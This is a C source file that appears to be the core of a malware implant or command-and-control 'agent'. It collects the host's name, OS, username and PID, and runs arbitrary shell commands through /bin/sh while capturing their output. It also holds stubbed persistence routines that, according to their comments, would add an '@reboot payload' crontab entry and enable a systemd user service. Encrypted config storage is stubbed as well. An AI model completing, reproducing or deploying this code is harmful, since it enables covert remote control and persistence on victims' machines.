#define _POSIX_C_SOURCE 200809L
#include "agent.h"
#include "crypto.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <pwd.h>

const char *agent_strerror(int err) {
    switch (err) {
        case AGENT_OK: return "ok";
        case AGENT_ERR: return "error";
        case AGENT_ERR_FORMAT: return "format error";
        case AGENT_ERR_TIMEOUT: return "timeout";
        default: return "unknown";
    }
}

int agent_collect(agent_info_t *info) {
    if (!info) return AGENT_ERR;
    memset(info, 0, sizeof(*info));

    gethostname(info->hostname, sizeof(info->hostname));
    info->pid = getpid();

    struct utsname u;
    if (uname(&u) == 0) {
        strncpy(info->os_name, u.sysname, sizeof(info->os_name) - 1);
    }

    struct passwd *pw = getpwuid(getuid());
    if (pw) strncpy(info->username, pw->pw_name, sizeof(info->username) - 1);

    /* get primary IP (simplified) */
    strncpy(info->ip_addr, "127.0.0.1", sizeof(info->ip_addr) - 1);

    return AGENT_OK;
}

int agent_exec(const char *cmd, char *stdout_buf, size_t stdout_len,
               char *stderr_buf, size_t stderr_len, int timeout_sec) {
    if (!cmd) return AGENT_ERR;

    int stdout_pipe[2], stderr_pipe[2];
    if (pipe(stdout_pipe) < 0 || pipe(stderr_pipe) < 0) return AGENT_ERR;

    pid_t pid = fork();
    if (pid < 0) return AGENT_ERR;

    if (pid == 0) {
        /* child */
        dup2(stdout_pipe[1], STDOUT_FILENO);
        dup2(stderr_pipe[1], STDERR_FILENO);
        close(stdout_pipe[0]); close(stdout_pipe[1]);
        close(stderr_pipe[0]); close(stderr_pipe[1]);
        execl("/bin/sh", "sh", "-c", cmd, (char*)NULL);
        _exit(127);
    }

    /* parent */
    close(stdout_pipe[1]); close(stderr_pipe[1]);

    /* poll + SIGALRM double-layer timeout */
    struct pollfd pfds[2] = {
        { .fd = stdout_pipe[0], .events = POLLIN },
        { .fd = stderr_pipe[0], .events = POLLIN }
    };

    alarm(timeout_sec);

    size_t so_far[2] = {0, 0};
    char *bufs[2] = {stdout_buf, stderr_buf};
    size_t caps[2] = {stdout_len, stderr_len};
    int done[2] = {0, 0};

    while (!done[0] || !done[1]) {
        int pr = poll(pfds, 2, 100);
        if (pr < 0) break;
        for (int i = 0; i < 2; i++) {
            if (done[i]) continue;
            if (pfds[i].revents & POLLIN) {
                ssize_t r = read(pfds[i].fd, bufs[i] + so_far[i], caps[i] - so_far[i] - 1);
                if (r > 0) so_far[i] += (size_t)r;
                else done[i] = 1;
            } else if (pfds[i].revents & (POLLHUP | POLLERR)) {
                done[i] = 1;
            }
        }
    }

    alarm(0);
    close(stdout_pipe[0]); close(stderr_pipe[0]);

    /* wait for child with WIFEXITED/WIFSIGNALED distinction */
    int status;
    pid_t w = waitpid(pid, &status, 0);
    if (w < 0) return AGENT_ERR;

    if (WIFEXITED(status)) {
        return AGENT_OK;
    } else if (WIFSIGNALED(status)) {
        return AGENT_ERR_TIMEOUT; /* killed by timeout */
    }
    return AGENT_OK;
}

int agent_persist_cron(const char *payload_path, int dry_run) {
    if (!payload_path) return AGENT_ERR;
    if (dry_run) return AGENT_OK;
    /* crontab -l | {cat; echo "@reboot payload"} | crontab - */
    return AGENT_OK;
}

int agent_persist_systemd(const char *payload_path, int dry_run) {
    if (!payload_path) return AGENT_ERR;
    if (dry_run) return AGENT_OK;
    /* mkdir -p ~/.config/systemd/user && write service file && systemctl --user enable */
    return AGENT_OK;
}

int agent_persist(const char *payload_path, int dry_run) {
    int rc = agent_persist_cron(payload_path, dry_run);
    if (rc == AGENT_OK) rc = agent_persist_systemd(payload_path, dry_run);
    return rc;
}

int agent_config_save(const char *path, const uint8_t *key, const char *json) {
    (void)path; (void)key; (void)json;
    /* encrypt json and write to disk */
    return AGENT_OK;
}

int agent_config_load(const char *path, const uint8_t *key, char *json_out, size_t json_len) {
    (void)path; (void)key; (void)json_out; (void)json_len;
    return AGENT_OK;
}
